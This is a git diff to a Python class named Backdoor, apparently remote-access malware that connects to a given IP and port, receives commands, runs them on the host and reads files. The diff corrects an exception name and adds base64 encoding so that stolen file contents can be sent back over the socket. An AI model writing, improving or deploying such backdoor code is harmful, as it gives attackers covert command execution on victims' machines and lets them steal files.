@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import socket, subprocess, json, os
+import base64
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -17,7 +18,7 @@ class Backdoor:
             try:
                 json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
-            except valueError:
+            except ValueError:
                 continue
 
     def execute_system_command(self,command):
@@ -29,7 +30,7 @@ class Backdoor:
 
     def read_file(self, path):
         with open(path, "rb") as file:
-            return file.read()
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
